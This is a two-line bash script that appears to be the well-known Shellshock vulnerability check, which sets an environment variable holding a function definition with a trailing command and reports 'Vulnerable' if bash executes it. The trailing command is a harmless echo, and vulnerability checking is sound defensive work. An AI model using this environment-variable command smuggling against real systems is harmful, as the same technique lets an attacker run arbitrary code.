#!/bin/bash

env x='() { :;}; echo Vulnerable' bash -c "echo This is a test."
